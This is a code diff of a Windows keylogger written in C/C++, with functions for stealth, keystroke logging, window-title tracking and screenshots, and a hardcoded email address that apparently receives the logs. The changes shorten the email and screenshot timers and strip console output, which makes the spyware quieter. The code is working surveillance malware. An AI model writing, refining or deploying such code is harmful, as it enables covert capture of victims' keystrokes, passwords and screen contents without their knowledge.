@@ -13,8 +13,8 @@ double elapsed, prev_elapsed = 0.0, mail_elapsed = 0.0;
 char last_window[256] = "siam";
 
 #define default_mail "mdsiam01@sharklasers.com"
-#define EMAIL_TIME 180.0  //3 minutes (keeping low for demonstration)
-#define SS_TIME 90.0  //1.5 minutes (keeping low for demonstration)
+#define EMAIL_TIME 120.0  //2 minutes (keeping low for demonstration)
+#define SS_TIME 60.0  //1 minute (keeping low for demonstration)
 
 void stealth()
 {
@@ -317,13 +317,11 @@ void trackWindowChanges()
     char this_window[256];
 
     GetWindowText(foreground, this_window, 256);
-        //cout<<this_window<<endl;
     if(strcmp(last_window,this_window)!=0)
     {
 
         strcpy(last_window,this_window);
         FILE* fileP = fopen("windows.txt","a");
-        cout<< this_window<<endl;
         fprintf(fileP, "%s\n", this_window);
         fclose(fileP);
     }
@@ -342,7 +340,7 @@ void logKeys()
         {
             char nameOfScreenshot[20];
             snprintf(nameOfScreenshot, 20, "image%d.bmp", ssCount); // puts string into buffer
-            printf("%s\n", nameOfScreenshot);
+
             ssCount++;
             ScreenCapture(nameOfScreenshot);
 
@@ -369,7 +367,7 @@ void logKeys()
             }
         }
 
-        //system("PAUSE");
+
     }
 }
 
